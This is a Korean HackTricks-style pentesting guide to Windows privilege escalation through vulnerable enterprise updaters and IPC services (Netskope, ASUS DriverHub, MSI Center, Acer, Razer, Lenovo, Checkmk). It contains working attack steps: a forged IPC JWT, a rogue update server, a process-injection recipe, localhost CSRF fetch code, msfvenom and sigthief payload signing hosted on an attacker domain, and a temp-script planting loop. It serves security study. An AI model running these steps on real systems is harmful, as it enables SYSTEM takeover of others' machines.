# 엔터프라이즈 자동 업데이트 프로그램과 권한이 높은 IPC 악용 (예: Netskope, ASUS 및 MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 IPC 표면이 간편하게 노출되고 권한이 높은 업데이트 흐름을 제공하는 엔터프라이즈 엔드포인트 에이전트 및 업데이트 프로그램에서 발견된 Windows 로컬 권한 상승 체인을 일반화합니다. 대표적인 사례는 Netskope Client for Windows < R129 (CVE-2025-0309)입니다. 권한이 낮은 사용자가 등록을 공격자가 제어하는 서버로 유도한 다음, SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

유사한 제품에 재사용할 수 있는 핵심 아이디어:
- 권한이 높은 서비스의 localhost IPC를 악용해 재등록 또는 재구성을 공격자 서버로 강제합니다.
- 벤더의 업데이트 엔드포인트를 구현하고, 악성 “서명된” 패키지를 가리키도록 가짜 Trusted Root CA를 전달하고 업데이트 프로그램을 설정합니다.
- 허술한 서명자 검사(CN 허용 목록), 선택적 digest 플래그, 느슨한 MSI 속성을 우회합니다.
- IPC가 “암호화”되어 있다면 레지스트리에 저장된, 누구나 읽을 수 있는 머신 식별자에서 키/IV를 도출합니다.
- 서비스가 호출자를 이미지 경로/프로세스 이름으로 제한하는 경우, 허용 목록에 있는 프로세스에 inject하거나 프로세스를 suspended 상태로 생성한 뒤 최소한의 스레드 컨텍스트 패치로 DLL을 bootstrap합니다.

사용자 지정 로컬 TCP 서비스는 PIN이나 다른 애플리케이션 자격 증명을 요구하더라도 동일한 방식으로 신원 및 입력 경계를 검토해야 합니다. 리스너와 해당 프로세스 및 유효 서비스 계정을 확인한 다음, 실제 배포된 바이너리/버전을 살펴보고 호출자가 제어하는 필드가 고정 버퍼에 복사되거나 자식 프로세스 명령을 구성하는 데 사용되기 전에 길이 검사를 거치는지 확인합니다. [Microsoft의 버퍼 오버런 지침](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)에서는 권한이 높은 네이티브 코드에서 외부 입력을 검사하지 않는 것이 왜 위험한지 설명합니다. 루프백 리스너, 하드코딩된 자격 증명 또는 프로세스 이름만으로는 메모리 손상이나 SYSTEM 권한으로의 실행이 입증되지 않습니다. 도달 가능성, 권한 부여, 코드 경로 및 완화 조치는 각각 별개의 조건입니다. 실행 중인 서비스에 크래시를 유발할 만큼 긴 입력을 보내는 대신, 일반적인 열거는 수동으로 수행하세요.

---
## 1) localhost IPC를 통해 등록을 공격자 서버로 강제하기

많은 에이전트에는 JSON을 사용해 localhost TCP를 통해 SYSTEM 서비스와 통신하는 사용자 모드 UI 프로세스가 포함되어 있습니다.

Netskope에서 관찰된 구성:
- UI: stAgentUI (무결성 수준 낮음) ↔ 서비스: stAgentSvc (SYSTEM)
- IPC 명령 ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

익스플로잇 흐름:
1) 백엔드 호스트를 제어하는 클레임(예: AddonUrl)이 포함된 JWT 등록 토큰을 만듭니다. 서명이 필요하지 않도록 alg=None을 사용합니다.
2) JWT와 테넌트 이름을 사용해 프로비저닝 명령을 호출하는 IPC 메시지를 전송합니다:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 서비스가 등록/설정용 rogue server에 요청을 보내기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

참고:
- 호출자 검증이 경로/이름 기반이라면 허용 목록에 있는 vendor 바이너리에서 요청을 시작합니다(§4 참조).<sup>[[1]](#references)[[2]](#references)</sup>

### 네트워크에 노출된 관리 IPC

이 신뢰 경계가 항상 localhost로 제한되는 것은 아닙니다. 보고된 MyReport Updater 2.1.1 사례에서는 `LocalSystem` 서비스가 모든 인터페이스에서 수신 대기하며, 참조 호스트, 포트, 작동 모드에 대한 인증되지 않은 gRPC 설정 변경을 허용했습니다. 원격 공격을 수행하려면 리스너에 대한 네트워크 접근과 서비스에서 선택한 참조 대상으로의 아웃바운드 접근이 모두 필요했습니다. 이후의 패키지 흐름이 파일 쓰기 경계를 넘을 수 있는지와 별도로 이 두 가지를 평가하세요.<sup>[[16]](#references)</sup>

---
## 2) 업데이트 채널을 하이재킹해 SYSTEM으로 코드 실행

클라이언트가 서버에 접속하면 예상되는 엔드포인트를 구현하고 공격자의 MSI를 전달합니다. 일반적인 순서는 다음과 같습니다.

1) /v2/config/org/clientconfig → 업데이트 주기가 매우 짧은 JSON 설정을 반환합니다. 예:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA 인증서를 반환합니다. 서비스는 이를 Local Machine Trusted Root 저장소에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 버전을 가리키는 메타데이터를 제공합니다.

실제 환경에서 흔히 볼 수 있는 검사를 우회하는 방법:
- Signer CN allow-list: 서비스는 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”와 같은지만 확인할 수 있습니다. rogue CA로 해당 CN을 가진 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST 속성: CERT_DIGEST라는 benign MSI 속성을 포함합니다. 설치 시에는 이를 검증하지 않습니다.
- 선택적 digest 검증: config 플래그(예: check_msi_digest=false)로 추가적인 암호 검증을 비활성화할 수 있습니다.

그 결과, SYSTEM 서비스가
C:\ProgramData\Netskope\stAgent\data\*.msi
에서 MSI를 설치하고 임의의 코드를 NT AUTHORITY\SYSTEM 권한으로 실행합니다.<sup>[[1]](#references)[[2]](#references)</sup>

패치 우회에서 얻을 교훈: 공급업체가 업데이트 소스를 암호학적으로 인증하는 대신 소수의 “신뢰할 수 있는” 도메인만 allow-list에 추가해 대응한다면, 여전히 트래픽을 조종할 수 있는 공급업체 소유 redirector나 reverse proxy를 찾아보세요. Netskope의 경우, 공개된 후속 연구에 따르면 R129 시기의 allow-list는 공격자가 제어하는 Azure App Service 콘텐츠를 프록시하는 `rproxy.goskope.com`을 통해 여전히 악용될 수 있었습니다. 호스트명 allow-list는 장애물일 뿐, 신뢰 경계로 취급하지 마세요.<sup>[[14]](#references)</sup>

또 다른 취약점 유형은 **자체적으로 일관되지만 인증되지 않은 패키지 메타데이터**입니다. MyReport 사례에서는 공격자가 제어하는 참조 경로가 수정된 archive를 제공했고, 중간자가 공급업체의 MD5 digest와 크기 응답을 updater에 도달하기 전에 변경했습니다. 해당 값들의 일치는 응답의 일관성만 확인했을 뿐, 공급업체 출처를 확인하지 않았습니다. MD5 collision은 필요하지 않았습니다. 호출자가 설치 디렉터리를 선택할 수 있었기 때문에 권한 상승 상태의 압축 해제가 파일 쓰기 경계가 되었습니다. 그 결과로 발생하는 DLL 로딩 primitive는 [임의 파일 쓰기를 DLL hijacking으로 연결하기](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack)에서 설명합니다.<sup>[[16]](#references)</sup>

---
## 3) 암호화된 IPC 요청 위조(해당하는 경우)

R127부터 Netskope는 IPC JSON을 Base64처럼 보이는 encryptData 필드로 감쌌습니다. 분석 결과, AES 키와 IV는 모든 사용자가 읽을 수 있는 레지스트리 값에서 파생되었습니다.
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화를 재현하고 표준 사용자 권한으로 유효한 암호화 명령을 보낼 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup> 일반적인 팁: 에이전트가 갑자기 IPC를 “암호화”한다면, HKLM 아래의 device ID, product GUID, install ID 등이 암호화 재료로 사용되는지 확인하세요.

---
## 4) IPC 호출자 allow-list 우회(경로/이름 검사)

일부 서비스는 TCP 연결의 PID를 확인한 다음, 이미지 경로/이름을 Program Files 아래에 있는 allow-list 등록 공급업체 바이너리(예: stagentui.exe, bwansvc.exe, epdlp.exe)와 비교해 피어를 인증하려고 합니다.

실용적인 우회 방법 두 가지:
- allow-list에 등록된 프로세스(예: nsdiag.exe)에 DLL injection을 수행하고, 해당 프로세스 내부에서 IPC를 proxy합니다.
- allow-list에 등록된 바이너리를 suspended 상태로 실행하고 CreateRemoteThread 없이 proxy DLL을 bootstrap하여(§5 참조), driver가 강제하는 tamper 규칙을 충족합니다.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protection에 적합한 injection: suspended process + NtContinue 패치

제품에는 보호된 프로세스의 핸들에서 위험한 권한을 제거하는 minifilter/OB callbacks driver(예: Stadrv)가 포함되는 경우가 많습니다.
- 프로세스: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME 권한을 제거합니다.
- 스레드: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE 권한만 허용합니다.

이러한 제약을 준수하는 신뢰할 수 있는 user-mode loader:
1) CREATE_SUSPENDED 플래그를 사용해 공급업체 바이너리를 CreateProcess합니다.
2) 여전히 허용된 핸들을 가져옵니다. 프로세스에는 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 스레드에는 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 핸들을 사용합니다(또는 알려진 RIP 위치의 코드를 패치하는 경우 THREAD_RESUME만 사용).
3) ntdll!NtContinue(또는 초기에 매핑되는 다른 보장된 thunk)를 덮어써 DLL 경로에서 LoadLibraryW를 호출한 다음 원래 위치로 돌아가는 작은 stub을 작성합니다.
4) ResumeThread로 프로세스 내부에서 stub을 실행해 DLL을 로드합니다.

이미 보호된 프로세스에 PROCESS_CREATE_THREAD 또는 PROCESS_SUSPEND_RESUME을 사용하지 않고 직접 생성했으므로, driver의 정책을 준수합니다.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 실용적인 도구
- NachoVPN (Netskope plugin)은 rogue CA, 악성 MSI 서명을 자동화하고 필요한 endpoint를 제공합니다: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope는 임의의 IPC 메시지(선택적으로 AES 암호화)를 작성하는 custom IPC client이며, allow-list에 등록된 바이너리에서 요청을 보내기 위한 suspended-process injection도 포함합니다.<sup>[[4]](#references)</sup>

## 7) 알 수 없는 updater/IPC 표면을 빠르게 분류하는 작업 흐름

새로운 endpoint agent나 motherboard “helper” 제품군을 접했을 때, 간단한 작업 흐름만으로도 유망한 privesc 대상을 살펴보고 있는지 대개 판단할 수 있습니다.<sup>[[6]](#references)</sup>

1) loopback listener를 열거하고 vendor 프로세스와 연결합니다:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 후보 named pipe 열거:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 플러그인 기반 IPC 서버에서 사용하는 레지스트리 기반 라우팅 데이터 수집:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 먼저 user-mode client에서 endpoint 이름, JSON key, command ID를 추출합니다. 패키징된 Electron/.NET 프런트엔드는 전체 스키마를 자주 leak합니다:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 프로세스를 최종적으로 실행하는 코드 경로만 찾지 말고, 실제 신뢰 조건을 찾아보세요:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

우선순위를 두고 살펴볼 패턴:
- `WinVerifyTrust` 없이 `CryptQueryObject`/인증서 파싱을 수행한다면, 보통 “인증서가 존재한다”는 사실을 “인증서가 신뢰된다”는 의미로 잘못 취급한 것입니다. 이로 인해 인증서 복제나 기타 가짜 서명자 트릭이 가능해질 수 있습니다.
- `Origin`, `Referer`, 다운로드 URL, 프로세스 이름 또는 서명자 CN에 대한 부분 문자열/접미사 검사는 인증이 아닙니다. `contains(".vendor.com")`은 공격자가 제어하는 유사 도메인을 이용해 보통 악용할 수 있습니다.
- 권한이 낮은 GUI가 “파일은 신뢰할 수 있다”고 판단하고 SYSTEM broker가 그 결과를 그대로 사용한다면, 클라이언트 측 DLL/JS를 패치하거나 재구현하는 것만으로 경계를 완전히 우회할 수 있는 경우가 많습니다(Razer 스타일의 검증 분리).
- broker가 페이로드를 `%TEMP%`/`C:\Windows\Temp`에 복사한 다음 해당 경로에서 검증하거나 예약한다면, TOCTOU 교체 가능 구간과 검증이 더 허술한 대체 `ExecuteTask()` wrapper를 제공하는 인접 플러그인 모듈을 즉시 테스트하세요.<sup>[[6]](#references)</sup>

named pipe를 많이 사용하는 대상의 경우, 프로토콜을 깊이 리버싱하기 전에 PipeViewer를 사용하면 취약한 DACL과 원격에서 접근 가능한 pipe를 빠르게 찾을 수 있습니다.<sup>[[11]](#references)</sup>

대상이 호출자를 PID, 이미지 경로 또는 프로세스 이름만으로 인증한다면, 이를 보안 경계가 아니라 약간의 장애물로 여기세요. 합법적인 클라이언트에 코드를 주입하거나 허용 목록에 있는 프로세스에서 연결하기만 해도 서버 검사를 통과하는 경우가 많습니다. named pipe의 경우, [클라이언트 가장 및 pipe 악용에 관한 이 페이지](named-pipe-client-impersonation.md)에서 해당 프리미티브를 더 자세히 다룹니다.

권한이 있는 **정리 또는 복원 broker**의 경우, pipe ACL뿐 아니라 경로 신뢰 경계도 살펴보세요. 서비스 실행 파일과 설치 디렉터리가 보호되어 있더라도, 권한이 낮은 호출자가 공유 디렉터리의 복원 대상 경로를 지정하거나 준비된 백업 파일의 이름을 바꿀 수 있습니다. 호출자가 복원 명령을 실행할 수 있는지, 정확한 준비 입력 파일이나 파일 이름을 수정할 수 있는지, broker가 더 높은 권한으로 실행되는지, 복원 작업이 실제로 선택된 보호 경로에 쓰는지를 각각 확인하세요. 쓰기 가능한 준비 디렉터리나 읽기 가능한 pipe만으로는 임의의 권한 상승 쓰기가 입증되지 않습니다. 대상 경로 매핑과 서비스 동작은 코드 검토 또는 통제된 테스트로 확인해야 합니다. 알 수 없는 정리 명령은 사용자 파일을 삭제할 수 있으므로 수동 열거 중에는 실행하지 마세요.

---
## 8) 공급업체 서명만으로 인증하는 모듈식 add-in broker (Lenovo Vantage 패턴)

새롭게 주목할 만한 변형은 **서명된 클라이언트 RPC broker**입니다. 권한이 낮은 Lenovo 서명 데스크톱 프로세스가 SYSTEM 서비스와 통신하고, 서비스는 `%ProgramData%` 아래 XML로 기술된 add-in 집합에 JSON 명령을 전달합니다. 허용된 서명 클라이언트 중 어느 하나에서든 코드 실행을 달성하면, 모든 `runas="system"` 계약이 공격 표면에 포함됩니다.<sup>[[15]](#references)</sup>

Lenovo Vantage 연구에서 관찰된 가치 높은 프리미티브:
- **호출자가 공급업체 서명을 받았다는 이유로 신뢰**: 연구자들은 Lenovo 서명 EXE를 쓰기 가능한 디렉터리에 복사하고 DLL 사이드로딩(`profapi.dll`)을 성립시켜 임의 코드가 서비스가 이미 신뢰하는 클라이언트 내부에서 실행되도록 함으로써 인증된 컨텍스트에 도달했습니다.
- **매니페스트 기반 공격 표면 탐색**: add-in은 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 아래에 선언되어 있습니다. 여러 계약이 `SYSTEM`으로 실행되므로, 이러한 매니페스트를 열거하면 broker 자체를 리버싱하는 것보다 실제 권한 명령을 더 빠르게 찾을 수 있습니다.
- **인증된 채널 뒤에 있는 명령별 버그**: 신뢰된 클라이언트 내부에 진입한 후 공개 연구를 통해 업데이트/설치 명령의 경로 순회 및 경쟁 조건, 권한 설정 데이터베이스의 raw-SQL 악용, 의도된 하이브 바깥에 쓰기가 가능했던 부분 문자열 기반 레지스트리 경로 검사가 발견되었습니다.

대상에서 유용한 정찰:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

실무적 요점: 헬퍼 제품군이 먼저 **호출자 프로세스**를 인증한 다음 수십 개의 플러그인/애드인 명령으로 디스패치하는 브로커를 제공한다면, 입구의 신뢰 검사를 우회한 것만으로 멈추지 마세요. 매니페스트/계약 테이블을 덤프하고 각 고권한 동사를 개별적으로 fuzz하세요. 인증된 채널 뒤에는 보통 여러 2차 버그가 숨어 있습니다.

---
## 1) 권한이 높은 HTTP API를 대상으로 한 브라우저-to-localhost CSRF (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 사용자 모드 HTTP 서비스(ADU.exe)를 실행하며, `https://driverhub.asus.com`에서 온 브라우저 호출을 기대합니다. Origin 필터는 Origin 헤더와 `/asus/v1.0/*`에서 노출되는 다운로드 URL에 대해 `string_contains(".asus.com")`을 단순히 검사합니다. 따라서 `https://driverhub.asus.com.attacker.tld`와 같은 공격자 제어 호스트도 검사를 통과하며 JavaScript에서 상태를 변경하는 요청을 보낼 수 있습니다.<sup>[[6]](#references)</sup> 추가 우회 패턴은 [CSRF 기초](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참조하세요.

실제 공격 흐름:
1) `.asus.com`을 포함하는 도메인을 등록하고 그곳에 악성 웹페이지를 호스팅합니다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 권한이 높은 엔드포인트(예: `Reboot`, `UpdateApp`)를 호출합니다.
3) 핸들러가 기대하는 JSON 본문을 전송합니다. 패킹된 프런트엔드 JS에서 아래 스키마를 확인할 수 있습니다.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

아래에 표시된 PowerShell CLI도 Origin 헤더를 신뢰된 값으로 스푸핑하면 성공합니다:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

따라서 공격자 사이트를 브라우저에서 방문하면 1-click(또는 `onload`를 통한 0-click) 로컬 CSRF가 발생해 SYSTEM helper를 실행합니다.

---
## 2) 안전하지 않은 code-signing 검증 및 certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`은 JSON 본문에 지정된 임의의 실행 파일을 다운로드해 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`에 캐시합니다. 다운로드 URL 검증에도 동일한 부분 문자열 로직을 재사용하므로 `http://updates.asus.com.attacker.tld:8000/payload.exe`가 허용됩니다. 다운로드 후 ADU.exe는 PE에 서명이 있는지, Subject 문자열이 ASUS와 일치하는지만 확인한 뒤 실행합니다. `WinVerifyTrust`도, 체인 검증도 수행하지 않습니다.

이 흐름을 weaponize하려면:
1) payload를 만듭니다(예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS의 signer를 복제합니다(예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe`를 `.asus.com` lookalike 도메인에 호스팅하고 위의 브라우저 CSRF를 통해 UpdateApp을 트리거합니다.

Origin 및 URL 필터가 모두 부분 문자열 기반이고 signer 검증은 문자열만 비교하므로, DriverHub는 공격자의 바이너리를 가져와 자신의 높은 권한 컨텍스트에서 실행합니다.<sup>[[6]](#references)</sup>

---
## 1) updater의 복사/실행 경로에서 발생하는 TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center의 SYSTEM 서비스는 각 프레임이 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`로 구성되는 TCP 프로토콜을 제공합니다. 핵심 component(Component ID `0f 27 00 00`)에는 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`가 포함됩니다. 해당 handler는 다음을 수행합니다.
1) 전달된 실행 파일을 `C:\Windows\Temp\MSI Center SDK.exe`로 복사합니다.
2) `CS_CommonAPI.EX_CA::Verify`를 통해 서명을 검증합니다(인증서 subject가 “MICRO-STAR INTERNATIONAL CO., LTD.”와 일치하고 `WinVerifyTrust`가 성공해야 합니다).
3) 공격자가 제어하는 인수와 함께 임시 파일을 SYSTEM으로 실행하는 scheduled task를 생성합니다.

검증과 `ExecuteTask()` 사이에 복사된 파일은 잠기지 않습니다. 공격자는 다음과 같이 할 수 있습니다.
- Frame A를 보내 MSI 서명된 정상 바이너리를 지정합니다(서명 검증을 통과하고 task가 예약되도록 함).
- 반복적인 Frame B 메시지를 전송해 경쟁 상태를 유발합니다. Frame B는 악성 payload를 지정하고 검증이 끝난 직후 `MSI Center SDK.exe`를 덮어씁니다.

Scheduler가 실행될 때는 원본 파일만 검증했음에도 덮어쓴 payload가 SYSTEM 권한으로 실행됩니다. 안정적으로 exploit하려면 두 개의 goroutine/thread에서 TOCTOU window를 확보할 때까지 CMD_AutoUpdateSDK를 반복 호출합니다.<sup>[[6]](#references)</sup>

---
## 2) custom SYSTEM-level IPC 및 impersonation 악용 (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe`가 로드하는 모든 plugin/DLL에는 `HKLM\SOFTWARE\MSI\MSI_CentralServer`에 저장된 Component ID가 할당됩니다. 프레임의 첫 4바이트로 component가 선택되므로 공격자는 임의의 module로 command를 전달할 수 있습니다.
- Plugin은 자체 task runner를 정의할 수 있습니다. `Support\API_Support.dll`은 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`을 제공하고, **signature validation 없이** `API_Support.EX_Task::ExecuteTask()`를 직접 호출합니다. 따라서 모든 로컬 사용자는 이를 `C:\Users\<user>\Desktop\payload.exe`로 지정해 결정적으로 SYSTEM 실행을 얻을 수 있습니다.
- Wireshark로 loopback 트래픽을 캡처하거나 dnSpy에서 .NET 바이너리를 분석하면 Component ↔ command 매핑을 빠르게 확인할 수 있습니다. 이후 custom Go/ Python client로 프레임을 재전송할 수 있습니다.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes 및 impersonation levels
- SYSTEM으로 실행되는 `ACCSvc.exe`는 `\\.\pipe\treadstone_service_LightMode`를 노출하며, 해당 discretionary ACL은 원격 client(예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용합니다. 파일 경로와 함께 command ID `7`을 보내면 서비스의 process-spawning routine이 호출됩니다.
- Client library는 인수와 함께 magic terminator byte(113)를 직렬화합니다. Frida/`TsDotNetLib`를 사용한 동적 계측([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)에서 계측 방법 참고)을 통해 native handler가 이 값을 `CreateProcessAsUser` 호출 전에 `SECURITY_IMPERSONATION_LEVEL` 및 integrity SID로 매핑하는 것을 확인할 수 있습니다.
- 113 (`0x71`)을 114 (`0x72`)로 바꾸면 전체 SYSTEM token을 유지하고 high-integrity SID (`S-1-16-12288`)를 설정하는 generic branch로 진입합니다. 따라서 실행된 바이너리는 로컬 및 머신 간 모두에서 제한 없는 SYSTEM 권한으로 실행됩니다.
- 여기에 노출된 installer flag(`Setup.exe -nocheck`)를 결합하면 lab VM에서도 ACC를 설치하고 vendor hardware 없이 pipe를 테스트할 수 있습니다.<sup>[[6]](#references)</sup>

이러한 IPC 버그는 localhost 서비스가 상호 인증(ALPC SID, `ImpersonationLevel=Impersonation` 필터, token filtering)을 적용해야 하는 이유와 모든 module의 “임의 바이너리 실행” helper가 동일한 signer 검증을 공유해야 하는 이유를 보여줍니다.

---
## 3) 취약한 user-mode 검증을 사용하는 COM/IPC “elevator” helper (Razer Synapse 4)

Razer Synapse 4는 이 유형에 또 다른 유용한 패턴을 추가했습니다. 낮은 권한의 사용자가 COM helper에 `RzUtility.Elevator`를 통해 process를 실행하도록 요청할 수 있으며, trust 결정은 privileged boundary 내에서 견고하게 수행되는 대신 user-mode DLL(`simple_service.dll`)에 위임됩니다.

관찰된 exploitation 경로:
- COM object `RzUtility.Elevator`를 생성합니다.
- `LaunchProcessNoWait(<path>, "", 1)`을 호출해 elevated launch를 요청합니다.
- 공개 PoC에서는 요청을 보내기 전에 `simple_service.dll` 내부의 PE-signature gate를 patch out하여 공격자가 선택한 임의의 실행 파일을 실행할 수 있습니다.<sup>[[6]](#references)[[10]](#references)</sup>

최소 PowerShell 호출:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

일반적인 요점: “helper” suite를 reverse engineering할 때 localhost TCP나 named pipes만 확인하고 끝내지 마세요. `Elevator`, `Launcher`, `Updater`, `Utility` 같은 이름의 COM class를 확인한 다음, 권한이 높은 service가 대상 binary 자체를 실제로 검증하는지, 아니면 수정 가능한 user-mode client DLL이 계산한 결과를 단순히 신뢰하는지 확인하세요. 이 패턴은 Razer에만 국한되지 않습니다. 권한이 높은 broker가 권한이 낮은 쪽에서 전달한 허용/거부 결정에 따라 동작하는 모든 분할 설계는 privesc 공격 표면이 될 수 있습니다.


---
## MSI 복구 중 예측 가능한 임시 스크립트 실행 (Checkmk Agent / CVE-2024-0670)

일부 Windows agent는 여전히 `C:\Windows\Temp`에 임시 `.cmd` 파일을 작성하고 `SYSTEM` 권한으로 실행하는 방식으로 권한이 필요한 작업을 처리합니다. 파일 이름을 예측할 수 있고 service가 기존 파일을 안전하게 다시 만들지 않는다면, 권한이 낮은 사용자가 향후 생성될 임시 파일을 **읽기 전용**으로 미리 만들 수 있습니다. 이렇게 하면 권한이 높은 프로세스가 자체 스크립트 대신 공격자가 제어하는 내용을 실행하게 됩니다.

취약한 Checkmk Agent 빌드에서 관찰된 사항:
- 임시 파일 패턴: `cmk_all_<PID>_1.cmd`
- 영향을 받는 branch: `2.0.0`, `2.1.0`, `2.2.0`
- 트리거: 캐시된 agent package의 MSI **복구**<sup>[[8]](#references)[[9]](#references)</sup>

실제 공격 절차:
1. 현재 process ID 또는 실행 중인 agent PID를 기준으로 현실적인 PID 범위를 추정합니다.
2. 짧은 **ASCII** `.cmd` payload를 작성합니다 (`Set-Content -Encoding Ascii` 또는 `cmd.exe` 리디렉션 사용. batch 파일에 UTF-16 PowerShell 출력을 사용하지 마세요).
3. 후보 범위에 해당하는 `C:\Windows\Temp\cmk_all_<PID>_1.cmd` 파일을 대량으로 만들고 각각을 읽기 전용으로 표시합니다.
4. 캐시된 MSI의 복구를 트리거하여 권한이 높은 service가 임시 스크립트를 다시 생성한 다음 실행하도록 합니다.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

취약한 제품이 Windows Installer로 설치되어 있다면, 복구를 실행하기 전에 `C:\Windows\Installer`에 캐시된 무작위로 보이는 MSI 파일을 해당 제품 이름에 연결하세요:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

운영 참고 사항:
- `qwinsta`는 `msiexec /fa`가 비대화형 WinRM 셸에서 실패할 때 유용합니다. 기존 데스크톱/연결 끊김 세션이 복구를 올바르게 트리거할 수 있는지 파악하는 데 도움이 됩니다.<sup>[[7]](#references)</sup>
- 이 패턴은 **쓰기 권한이 모두에게 열려 있는 위치에 임시 스크립트를 준비한 뒤 SYSTEM 권한으로 실행하는** 다른 endpoint agent 및 updater에도 적용됩니다. 예측 가능한 이름, 배타적 생성 의미 체계의 부재, 필요할 때 트리거할 수 있는 repair/update 흐름을 확인하세요.

### 대화형 installer repair 및 권한 있는 콘솔

